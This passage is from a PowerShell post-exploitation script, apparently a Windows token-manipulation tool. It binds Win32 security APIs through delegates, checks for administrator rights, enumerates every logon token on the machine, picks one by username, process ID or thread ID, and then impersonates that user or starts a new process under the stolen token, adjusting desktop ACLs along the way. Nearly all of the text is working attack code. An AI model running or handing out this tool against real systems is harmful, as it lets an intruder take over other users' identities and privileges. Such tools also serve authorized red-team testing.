    $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
    $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
    $LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
    $LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $OpenThreadAddr = Get-ProcAddress kernel32.dll OpenThread
    $OpenThreadDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadAddr, $OpenThreadDelegate)

    $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
    $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
    $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)

    $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
    $CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
    $CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)

    $OpenWindowStationWAddr = Get-ProcAddress user32.dll OpenWindowStationW
    $OpenWindowStationWDelegate = Get-DelegateType @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    $OpenWindowStationW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenWindowStationWAddr, $OpenWindowStationWDelegate)

    $OpenDesktopAAddr = Get-ProcAddress user32.dll OpenDesktopA
    $OpenDesktopADelegate = Get-DelegateType @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenDesktopA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenDesktopAAddr, $OpenDesktopADelegate)

    $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
    $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
    $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)

    $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
    $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
    $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)

    $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
    $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)

    $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
    $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
    $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)

    $GetSecurityInfoAddr = Get-ProcAddress advapi32.dll GetSecurityInfo
    $GetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType()) ([UInt32])
    $GetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetSecurityInfoAddr, $GetSecurityInfoDelegate)

    $SetSecurityInfoAddr = Get-ProcAddress advapi32.dll SetSecurityInfo
    $SetSecurityInfoDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    $SetSecurityInfo = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetSecurityInfoAddr, $SetSecurityInfoDelegate)

    $GetAceAddr = Get-ProcAddress advapi32.dll GetAce
    $GetAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([IntPtr])
    $GetAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetAceAddr, $GetAceDelegate)

    $LookupAccountSidWAddr = Get-ProcAddress advapi32.dll LookupAccountSidW
    $LookupAccountSidWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [UInt32].MakeByRefType(), [UInt32].MakeByRefType()) ([Bool])
    $LookupAccountSidW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupAccountSidWAddr, $LookupAccountSidWDelegate)

    $AddAccessAllowedAceAddr = Get-ProcAddress advapi32.dll AddAccessAllowedAce
    $AddAccessAllowedAceDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    $AddAccessAllowedAce = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddAccessAllowedAceAddr, $AddAccessAllowedAceDelegate)

    $CreateWellKnownSidAddr = Get-ProcAddress advapi32.dll CreateWellKnownSid
    $CreateWellKnownSidDelegate = Get-DelegateType @([UInt32], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $CreateWellKnownSid = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateWellKnownSidAddr, $CreateWellKnownSidDelegate)

    $SetEntriesInAclWAddr = Get-ProcAddress advapi32.dll SetEntriesInAclW
    $SetEntriesInAclWDelegate = Get-DelegateType @([UInt32], $EXPLICIT_ACCESS.MakeByRefType(), [IntPtr], [IntPtr].MakeByRefType()) ([UInt32])
    $SetEntriesInAclW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SetEntriesInAclWAddr, $SetEntriesInAclWDelegate)

    $LocalFreeAddr = Get-ProcAddress kernel32.dll LocalFree
    $LocalFreeDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
    $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)

    $LookupPrivilegeNameWAddr = Get-ProcAddress advapi32.dll LookupPrivilegeNameW
    $LookupPrivilegeNameWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UInt32].MakeByRefType()) ([Bool])
    $LookupPrivilegeNameW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeNameWAddr, $LookupPrivilegeNameWDelegate)
    ###############################

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") -and $PsCmdlet.ParameterSetName -ine "RevToSelf")
    {
        Write-Error "Script must be run as administrator" -ErrorAction Stop
    }

    #If running in session 0, force NoUI
    if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
    {
        Write-Verbose "Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)"
        $NoUI = $true
    }

    if ($PsCmdlet.ParameterSetName -ieq "RevToSelf")
    {
        Invoke-RevertToSelf -ShowOutput
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "CreateProcess" -or $PsCmdlet.ParameterSetName -ieq "ImpersonateUser")
    {
        $AllTokens = Enum-AllTokens

        #Select the token to use
        [IntPtr]$hToken = [IntPtr]::Zero
        $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
        if ($Username -ne $null -and $Username -ne '')
        {
            if ($UniqueTokens.ContainsKey($Username))
            {
                $hToken = $UniqueTokens[$Username].hToken
                Write-Verbose "Selecting token by username"
            }
            else
            {
                Write-Error "A token belonging to the specified username was not found. Username: $($Username)" -ErrorAction Stop
            }
        }
        elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
        {
            foreach ($Token in $AllTokens)
            {
                if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $ProcessId)
                {
                    $hToken = $Token.hToken
                    Write-Verbose "Selecting token by ProcessID"
                }
            }

            if ($hToken -eq [IntPtr]::Zero)
            {
                Write-Error "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
            }
        }
        elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
        {
            foreach ($Token in $AllTokens)
            {
                if (($Token | Get-Member ThreadId) -and $Token.ThreadId -eq $ThreadId)
                {
                    $hToken = $Token.hToken
                    Write-Verbose "Selecting token by ThreadId"
                }
            }

            if ($hToken -eq [IntPtr]::Zero)
            {
                Write-Error "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened." -ErrorAction Stop
            }
        }
        elseif ($Process -ne $null)
        {
            foreach ($Token in $AllTokens)
            {
                if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $Process.Id)
                {
                    $hToken = $Token.hToken
                    Write-Verbose "Selecting token by Process object"
                }
            }

            if ($hToken -eq [IntPtr]::Zero)
            {
                Write-Error "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened." -ErrorAction Stop
            }
        }
        else
        {
            Write-Error "Must supply a Username, ProcessId, ThreadId, or Process object"  -ErrorAction Stop
        }

        #Use the token for the selected action
        if ($PsCmdlet.ParameterSetName -ieq "CreateProcess")
        {
            if (-not $NoUI)
            {
                Set-DesktopACLs
            }

            Create-ProcessWithToken -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru

            Invoke-RevertToSelf
        }
        elseif ($ImpersonateUser)
        {
            Invoke-ImpersonateUser -hToken $hToken | Out-Null
            Write-Output "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)"
        }

        Free-AllTokens -TokenInfoObjs $AllTokens
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "WhoAmI")
    {
        Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
    }
    else #Enumerate tokens
    {
        $AllTokens = Enum-AllTokens

        if ($PsCmdlet.ParameterSetName -ieq "ShowAll")
        {
            Write-Output $AllTokens
        }
        else
        {
            Write-Output (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser.Values
        }

        Invoke-RevertToSelf

        Free-AllTokens -TokenInfoObjs $AllTokens
    }
}
